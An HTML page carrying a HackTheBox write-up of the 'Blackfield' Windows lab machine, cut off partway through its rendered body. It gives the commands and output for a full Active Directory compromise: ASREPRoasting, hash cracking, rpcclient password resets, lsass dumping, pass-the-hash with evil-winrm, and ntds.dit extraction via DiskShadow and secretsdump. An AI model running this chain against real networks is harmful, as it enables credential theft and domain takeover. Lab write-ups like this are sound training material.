<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Blackfield | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,hard"><meta name=description content="Blackfield HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/blackfield/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/blackfield/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Blackfield "><meta property="og:description" content="Blackfield HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/blackfield/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-03T16:30:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png"><meta name=twitter:title content="Blackfield "><meta name=twitter:description content="Blackfield HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Blackfield ","item":"https://s4ch.github.io/writeups/hackthebox/blackfield/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Blackfield ","name":"Blackfield ","description":"Blackfield HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","hard"],"articleBody":"Information Name: Blackfield Profile: www.hackthebox.eu Difficulty: Hard OS: Windows Points: 40 Overview TL;DR:\nInstall tools used in this WU on BlackArch Linux:\n1 $ pacman -S nmap smbclient impacket python-pypykatz evil-winrm Network enumeration Port \u0026 service discovery with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.026s latency). Not shown: 65527 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r SF:(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver SF:sion\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h06m19s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-09-18T03:50:43 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds It seems we have here a domain controller with hostname DC01.\nEdit /etc/hosts to add the local domain:\n1 10.10.10.192 backfield.local SMB enumeration Let’s find some some shares:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ smbclient -L //10.10.10.192 Enter WORKGROUP\\cyfun's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share forensic Disk Forensic / Audit share. IPC$ IPC Remote IPC NETLOGON Disk Logon server share profiles$ Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available There are two non-default shares:\nforensic profiles$ One is not accessible but the other is:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ smbclient //10.10.10.192/forensic Enter WORKGROUP\\cyfun's password: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e ^C $ smbclient //10.10.10.192/profiles$ Enter WORKGROUP\\cyfun's password: Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Wed Jun 3 18:47:12 2020 .. D 0 Wed Jun 3 18:47:12 2020 AAlleni D 0 Wed Jun 3 18:47:11 2020 ABarteski D 0 Wed Jun 3 18:47:11 2020 ABekesz D 0 Wed Jun 3 18:47:11 2020 ABenzies D 0 Wed Jun 3 18:47:11 2020 ABiemiller D 0 Wed Jun 3 18:47:11 2020 AChampken D 0 Wed Jun 3 18:47:11 2020 ACheretei D 0 Wed Jun 3 18:47:11 2020 ... Those folders look like people’s profile, but there are three folders not starting with an uppercase letter that doesn’t look like a name.\naudit2020 support svc_backup We can save all profiles to a file:\n1 $ printf %s 'dir' | smbclient //10.10.10.192/profiles$ '' | sed '1,3d;$d' | cut -d ' ' -f 3 -s \u003e profiles.txt As we know from nmap that the is Kerberos running, let’s try ASREPRoast.\nThe ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).\nRef. HackTricks - ASREPRoast\nThen Impacket script GetNPUsers allow to check if Kerberos pre-auth is enabled for those accounts and extract their password hash:\n1 2 3 4 5 6 7 8 $ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) ... [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set ... [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set ... [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) Only support had is hash extracted.\n1 2 $ cat hash.txt $krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94 Now we can crack it with John the Ripper:\n1 2 3 4 5 $ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl $ john hash.txt --show $krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight 1 password hash cracked, 0 left RPC enumeration We can know make use of the freshly discovered credentials to launch an authenticated RPC scan to find domain users.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ rpcclient -U support -W backfield.local 10.10.10.192 Enter BACKFIELD.LOCAL\\support's password: rpcclient $\u003e enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[audit2020] rid:[0x44f] user:[support] rid:[0x450] user:[BLACKFIELD764430] rid:[0x451] user:[BLACKFIELD538365] rid:[0x452] ... user:[BLACKFIELD438814] rid:[0x584] user:[svc_backup] rid:[0x585] user:[lydericlefebvre] rid:[0x586] We can see lydericlefebvre, a new account we didn’t see earlier.\nNow let’s list the domain groups:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] Those are only default groups. Let’s check info about the special accounts we have.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ rpcclient $\u003e queryuser 0x586 User Name : lydericlefebvre Full Name : Lyd├⌐ric aas. Lefebvre Home Drive : Dir Drive : Profile Path: Logon Script: Description : @lydericlefebvre - VM Creator Workstations: Comment : Remote Dial : Logon Time : Thu, 01 Jan 1970 01:00:00 CET Logoff Time : Thu, 01 Jan 1970 01:00:00 CET Kickoff Time : Thu, 14 Sep 30828 04:48:05 CEST Password last set Time : Fri, 28 Feb 2020 23:33:36 CET Password can change Time : Sat, 29 Feb 2020 23:33:36 CET Password must change Time: Thu, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x586 group_rid: 0x201 acb_info : 0x00000210 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... I don’t know if this will be useful later but we now known that lydericlefebvre could be able to create VM. There was nothing special about the other accounts.\nPrivilege Escalation of Machine : from support to audit2020 In case our account is privileged we can try to change other account password. chgpasswd won’t help us as it requires the old password. But setuserinfo doesn’t.\n1 2 3 rpcclient $\u003e setuserinfo Usage: setuserinfo username level password [password_expired] result was NT_STATUS_INVALID_PARAMETER The level is defined from USER_INFORMATION_CLASS.\n1 2 3 4 5 6 7 8 9 rpcclient $\u003e setuserinfo audit2020 23 cyfun123! rpcclient $\u003e setuserinfo svc_backup 23 cyfun123! result: NT_STATUS_ACCESS_DENIED result was NT_STATUS_ACCESS_DENIED rpcclient $\u003e setuserinfo lydericlefebvre 23 cyfun123! result: NT_STATUS_ACCESS_DENIED result was NT_STATUS_ACCESS_DENIED Privilege Escalation of Machine : from audit2020 to svc_backup With support or unauthenticated we were not able to list the content of the forensic share but we can with audit2020. So let’s dump all we can:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ mkdir -p Shares/forensic $ cd Shares/forensic $ smbclient //10.10.10.192/forensic -U audit2020 -W blackfield.local cyfun123! Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Feb 23 14:03:16 2020 .. D 0 Sun Feb 23 14:03:16 2020 commands_output D 0 Sun Feb 23 19:14:37 2020 memory_analysis D 0 Thu May 28 22:28:33 2020 tools D 0 Sun Feb 23 14:39:08 2020 7846143 blocks of size 4096. 4156574 blocks available smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * PS: a more clever approach would be to avoid dumping tools/ which will take a lot of time and space for generic binaries we do not need.\nIn memory_analissy there is a lsass dump.\n1 2 3 4 $ cd memory_analysis $ unzip lsass.zip Archive: lsass.zip inflating: lsass.DMP Then we can use pypykatz, Python implementation of Mimikatz, to try to dump hashes from here.\n1 2 $ pypykatz lsa minidump lsass.DMP \u003e lsass_dump.txt INFO:root:Parsing file lsass.DMP So we obtained those two SHA1 hashes:\n1 2 svc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c Administrator:db5c89a961644f0978b4b69a4d2a2239d7886368 And NT hashes:\n1 2 svc_backup:9658d1d1dcd9250115e2205d9f48400d Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 We can use evil-winrm to make a pass the hash (PtH) authentication and gain PowerShell acess:\n1 2 3 4 5 6 7 8 9 $ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e gc ../Desktop/user.txt 0d1d70d4c5439a332577fcbc2bcbed15 *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e Privilege Escalation of Machine : from svc_backup to root Let’s check what we can do with this account:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e net user svc_backup User name svc_backup Full Name Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/23/2020 10:54:48 AM Password expires Never Password changeable 2/24/2020 10:54:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/20/2020 9:38:19 PM Logon hours allowed All Local Group Memberships *Backup Operators *Remote Management Use Global Group memberships *Domain Users The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Our account have way to much power!\nSeBackup \u0026 SeRestore privileges (from the Backup Operators group) allow us to set permissionand ownership on each file \u0026 folder.\nReferences:\nDiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018 show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019 Normally we shouldn’t be able to access ntds.dit (Active Directory database) but since SeBackup \u0026 SeRestore privileges let us set any permission on any file we will be able to fix that.\nLet’s auto-gives us full control on ntds.dit.\n1 2 3 4 5 6 7 $ntds_file = \"C:\\Windows\\NTDS\\ntds.dit\" $acl_ntds = Get-Acl $ntds_file $domain = \"blackfield.local\" $account = \"svc_backup\" $access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule(\"$domain\\$account\",\"FullControl\",\"Allow\") $acl_ntds.SetAccessRule($access_rule) $acl_ntds | Set-Acl $ntds_file 1 2 3 4 Get-acl $ntds_file | select -expand accesstostring BLACKFIELD\\svc_backup Allow FullControl NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullContro Now we’ll use DiskShadow to make a shadow copy of the ntds.\nDiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode.\nMicrosoft Docs\nLet’s prepapre the copy script (diskshadow.txt) to run DiskShadow in script mode.\n1 2 3 4 5 6 7 set context persistent nowriters# add volume c: alias cyfun# create# expose %cyfun% x:# exec \"cmd.exe\" /c copy x:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit# delete shadows volume %cyfun%# reset# Then we can use evil-winrm native upload feature.\n1 2 3 4 5 6 *Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e upload /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt to C:\\Users\\svc_backup\\Videos\\diskshadow.txt Data: 268 bytes of 268 bytes copied Info: Upload successful! And then call DiskShadow.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 *Evil-WinRM* PS C:\\Users\\svc_backup\u003e diskshadow.exe /s C:\\Users\\svc_backup\\Videos\\diskshadow.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 9/21/2020 12:12:50 AM -\u003e set context persistent nowriters -\u003e add volume c: alias cyfun -\u003e create Alias cyfun for shadow ID {eef6f0be-3c60-4e69-985d-3bc400a24ff1} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} set as environment variable. Querying all shadow copies with the shadow copy set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} * Shadow copy ID = {eef6f0be-3c60-4e69-985d-3bc400a24ff1} %cyfun% - Shadow copy set: {12b5d80f-4368-4727-a02b-1b22f5e020ef} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 9/21/2020 12:12:51 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u003e expose %cyfun% z: -\u003e %cyfun% = {eef6f0be-3c60-4e69-985d-3bc400a24ff1} The shadow copy was successfully exposed as z:\\. -\u003e exec \"cmd.exe\" /c copy z:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit The script file name is not valid. EXEC \u003cfile.cmd\u003e Execute a script file on the local machine. This command is used to duplicate or restore data as part of a backup or restore sequence. As I got issues with the exec command I manually copied the file afterward:\n1 *Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e cp x:\\windows\\ntds\\ntds.dit . Then we can also dump the SYSTEM hive:\n1 *Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e reg save hklm\\system system.hive Again, we can use evil-winrm native download feature.\n1 2 3 4 *Evil-WinRM* PS C:\\Users\\svc_backup\\Videos\u003e download ntds.dit /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit Info: Downloading C:\\Users\\svc_backup\\Videos\\ntds.dit to /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit Info: Download successful! Finally we can use secretsdump from Impacket to extract the hashes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ secretsdump.py -ntds ntds.dit -system system.hive LOCAL Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5::: support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: BLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: ... Again a PtH using evil-winrm with Administrator account.\n1 2 3 4 5 6 7 8 $ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e gc ../Desktop/root.txt 511fa0e63117cc3e746a523d0b5fd0b8 ","wordCount":"2334","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png","datePublished":"2020-10-03T16:30:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/blackfield/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Blackfield</h1><div class=post-description>Blackfield HackTheBox writeup</div><div class=post-meta><span title='2020-10-03 16:30:00 +0000 UTC'>October 3, 2020</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2334 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
,
<a href=https://s4ch.github.io/tags/hard/ class=post-tag title=hard>hard</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/blackfield/blackfield.png alt="Blackfield HackTheBox Machine"><p>Blackfield - Hard Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#smb-enumeration>SMB enumeration</a></li><li><a href=#rpc-enumeration>RPC enumeration</a></li><li><a href=#privilege-escalation-of-machine--from-support-to-audit2020>Privilege Escalation of Machine : from support to audit2020</a></li><li><a href=#privilege-escalation-of-machine--from-audit2020-to-svc_backup>Privilege Escalation of Machine : from audit2020 to svc_backup</a></li><li><a href=#privilege-escalation-of-machine--from-svc_backup-to-root>Privilege Escalation of Machine : from svc_backup to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Blackfield</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/255>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 40</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>:</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -S nmap smbclient impacket python-pypykatz evil-winrm
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.192
</span></span><span class=line><span class=cl>Host is up (0.026s latency).
</span></span><span class=line><span class=cl>Not shown: 65527 filtered ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain?
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   DNSVersionBindReqTCP:
</span></span><span class=line><span class=cl>|     version
</span></span><span class=line><span class=cl>|_    bind
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z)
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
